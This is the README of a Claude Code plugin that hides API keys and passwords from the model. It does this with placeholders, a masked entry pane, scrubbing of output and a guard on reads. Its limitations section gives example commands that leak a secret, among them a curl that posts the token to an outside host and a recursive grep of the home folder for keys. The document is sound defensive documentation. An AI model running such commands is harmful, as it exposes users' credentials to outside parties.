# bws-secrets

> Lets Claude use your API keys and passwords in shell commands without the values ever entering the conversation.

When Claude needs a key, token or password, it asks with `request_secret`. A masked entry opens and you type the value
there, not in the chat. It is saved to a file outside your project, and Claude only ever sees a placeholder,
`{{secret:NAME}}`. A Bash command that contains the placeholder gets the real value when it runs, and the command's
output is scrubbed before Claude Code stores it. The value does not reach the model or the transcript.

## Install

```
claude plugin marketplace add bsmi021/bws-claude-mods
claude plugin install bws-secrets@bws-mods
```

Then `/reload-plugins`. Requires Claude Code 2.1.296 or later. The masked entry keeps its own pane. Saved names (never
values) are also listed in a Secrets tab of [bws-cockpit](../bws-cockpit/README.md)'s dashboard (0.21.1 or later);
the mod works without it.

## Use

| Command | What it does |
| --- | --- |
| `/secrets` | Lists the saved names for this project and their placeholders. Never shows a value. |
| `/secrets remove NAME` | Deletes one saved secret. Commands that use its placeholder are then refused. |

Claude calls the tool `mcp__bws-secrets__request_secret` (`name`, `purpose`). The entry pane shows what the secret is
for. Click the box, type the value (each character shows as a dot), and press Enter. `Keep the saved value` reuses an
earlier value of the same name. `Cancel`, `x` or closing the pane saves nothing. The tool's result is only
`saved as NAME; use {{secret:NAME}}`.

The Secrets tab lists each saved name with its placeholder, and says when Claude is asking for one.

## What it does

| What | How |
| --- | --- |
| `request_secret` | Opens the masked entry and waits for you (up to 10 minutes, or until the turn is interrupted). A bad value asks you to type it again. |
| `{{secret:NAME}}` in a Bash command | The command is rewritten so the shell reads `NAME` from the saved file and exports it, and the placeholder becomes `${NAME}`. The rewritten command holds the file's path, never the value. |
| Output scrub | Every Bash result (stdout, stderr, an error text, and a large output Claude Code kept in a file) has each saved value replaced by `{{secret:NAME}}`. It also catches the value as JSON-escaped, base64, base64url, percent-encoded and hex text. |
| Read guard | Read, Grep, Glob and Bash calls that would read the secrets folder are refused, with a note telling Claude to use the placeholder. |

Rules:

- A name is an upper-case letter followed by upper-case letters, digits or `_` (at most 64 characters), and not a shell
  or system variable such as `PATH` or `HOME`.
- A value is one line of 4 to 8,192 characters.
- A placeholder with no saved value is refused, and the message tells Claude to call `request_secret`.
- A command with a placeholder cannot run in the background, because its later output would not pass through the scrub.
- Without a screen (headless, mobile, VS Code), `request_secret` reuses a saved name and refuses an unsaved one, telling
  Claude to ask you to run the session in a terminal or the desktop app.
- If the scrub cannot run after a command ran, the output is withheld rather than shown.

## Options

Set in `/plugin`, or under `pluginConfigs["bws-secrets"].options` in settings.json.

| Option | Default | What it does |
| --- | --- | --- |
| `secretsDir` | empty | Folder for the saved values, one `<project>.env` file per working directory (named the way Claude Code names its project folders, such as `C--Projects-app.env`). Empty: `~/.claude/bws-secrets`. Keep it outside your projects. |

No model is called, so there are no model options.

## Permissions and data

**Where secrets are stored.** In a plain-text dotenv file (`NAME=value`, one per line) at
`<secretsDir>/<project>.env`, by default under `~/.claude/bws-secrets`. They are not encrypted. A Claude Code mod
cannot set file permissions, so restrict the folder yourself if you need to. Nothing is stored in the project, in the
conversation or in the mod's state; the typed value is held only in the entry pane until you press Enter.

**What Claude sees.** Only the name, your purpose text, the tool result `saved as NAME; use {{secret:NAME}}`, and the
placeholder in the commands it writes. It never sees a value, in the prompt, the tool result, the transcript, the
stream (`-p`, the SDK) or `$.session.messages()`.

**What the mod does with a command.** For a Bash command with a placeholder, the shell reads the value from the file at
run time and exports it as an environment variable for that command. The value is not in the rewritten command, the
permission prompt or the shell's command line. Any program the command starts can read the variable.

**What it refuses.**

- Read, Grep and Glob calls whose path is or reaches the secrets folder, and Bash commands that name the folder's path.
  The match is on the full path in the forms a shell accepts (`~`, `$HOME`, a drive path, `/c/...`), not on the folder
  name alone.
- A placeholder with an unsaved, invalid or reserved name.
- A placeholder in a background command.
- A `request_secret` call while you are already being asked for another secret.

**What it does not protect against.**

- **A command that sends the value somewhere.** `curl -d "{{secret:TOKEN}}" https://elsewhere` runs as written. Review
  commands that use a placeholder as you would any other.
- **A file the value is written to, or a file you point Claude at**, such as `echo "{{secret:TOKEN}}" > out.txt`
  followed by a Read of `out.txt`, or a `.env` file in the project. Only Bash output is scrubbed, not other tools'
  results.
- **A value transformed into a form the scrub does not list**: reversed, split, encrypted, or encoded another way.
- **Other ways into the folder**: PowerShell or another shell tool, an MCP server, a subagent's own process, a
  recursive search of a parent folder in Bash (`grep -r KEY ~`), or a path built at run time. Placeholders are expanded
  only in the Bash tool.
- **Anyone with access to your user account**, and **other mods**: mods are not sandboxed and could read the file or
  watch this mod's events.

**Network, models, processes.** No network calls and no model calls. While it waits for you, it runs a one-second
sleeper process in a loop (`ping -n 2 127.0.0.1` on Windows, `sleep 1` elsewhere), because a hook may only use 10
seconds of its own time and the clock stops while a call to Claude Code is in flight. It reads and writes only the
secrets file, plus a large Bash output's file when it has to scrub it.

## Compatibility

Checked on Claude Code 2.1.296 on Windows 11 with Git Bash as the Bash tool's shell: automated tests for the rewrite,
the scrub, the guard (including a corpus of about 64,000 real commands, none wrongly refused) and `request_secret`, and
headless runs showing no value in the stream or the transcript file. The masked entry in a real terminal and in the
desktop app, including whether a click gives it the keyboard, and the permission prompt's text for a rewritten command,
have not been checked live. The rewrite needs a POSIX shell (`sed`, `head`, `tr`) for the Bash tool.

## License

MIT. Version history: [CHANGELOG.md](CHANGELOG.md).
